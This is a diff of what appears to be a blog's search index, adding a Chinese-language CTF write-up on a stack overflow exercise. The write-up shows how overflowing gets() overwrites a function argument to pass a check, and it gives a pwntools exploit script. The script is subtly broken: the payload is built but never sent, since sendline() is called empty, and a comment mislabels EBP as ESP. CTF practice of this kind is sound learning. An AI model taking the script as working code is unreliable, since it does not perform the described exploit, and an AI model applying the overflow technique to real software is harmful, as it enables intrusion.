@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>【Pwn1】栈溢出+覆盖判断条件练习题</title>
+      <link href="/2025/03/15/%E3%80%90Pwn1%E3%80%91%E6%A0%88%E6%BA%A2%E5%87%BA-%E8%A6%86%E7%9B%96%E5%88%A4%E6%96%AD%E6%9D%A1%E4%BB%B6%E7%BB%83%E4%B9%A0%E9%A2%98/"/>
+      <url>/2025/03/15/%E3%80%90Pwn1%E3%80%91%E6%A0%88%E6%BA%A2%E5%87%BA-%E8%A6%86%E7%9B%96%E5%88%A4%E6%96%AD%E6%9D%A1%E4%BB%B6%E7%BB%83%E4%B9%A0%E9%A2%98/</url>
+      
+        <content type="html"><![CDATA[<p>题目：</p><p><a href="assets/pwn0-20250315135007-mqj492o">pwn0</a></p><p>通过网盘分享的文件：pwn1<br>链接: <a href="https://pan.baidu.com/s/1wbcX-sBng65_mNA0vrIKqQ?pwd=1234">https://pan.baidu.com/s/1wbcX-sBng65_mNA0vrIKqQ?pwd=1234</a> 提取码: 1234<br>（手机打开转存效果更佳）</p><p>知识点：栈溢出理解</p><p>先来复习一下，栈的结构和参数存储的位置</p><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250315142713291.png" alt="image-20250315142713100"></p><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250315142722955.png" alt="image-20250315142722818"></p><p>把a1替换为0x61616161</p><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250315142727498.png" alt="image-20250315142727399"></p><p>gets() 函数不会限制用户输入的数据长度，而变量 s 的大小不是无限的</p><p>s输入的目的是替换 a1的值，将 a1 改写为 0x61616161，让if判断成立。</p><p>我们知道函数参数在栈中是在EIP（返回地址）的上面（地址的上面，高地址）</p><p>现在我们选择使用cyclic去预判（IDA有时候显示的不准确，汇编层面可以看s局部变量存储方式，如果是带有ebp寄存器参与可能显示不准确）</p><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250315142732202.png" alt="image-20250315142732088"></p><p>cyclic结合gdb的方式</p><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250315142737462.png" alt="image-20250315142737323"></p><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250315142743303.png" alt="image-20250315142743209"></p><p>‘A’*28 + EBP值替换 + 返回地址(EIP) + 0x61616161</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p= process(<span class="string">&#x27;./pwn0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#局部变量 + ESP + EIP + 替换a1函数参数</span></span><br><span class="line">shell_code=<span class="string">b&#x27;A&#x27;</span>*<span class="number">28</span>+<span class="string">b&#x27;s&#x27;</span>*<span class="number">4</span>+<span class="string">b&#x27;e&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0x61616161</span>)</span><br><span class="line"></span><br><span class="line">p.sendline()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> Pwn </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>2025腾讯面试一面总结</title>
       <link href="/2025/03/14/2025%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95%E4%B8%80%E9%9D%A2%E6%80%BB%E7%BB%93/"/>
       <url>/2025/03/14/2025%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95%E4%B8%80%E9%9D%A2%E6%80%BB%E7%BB%93/</url>
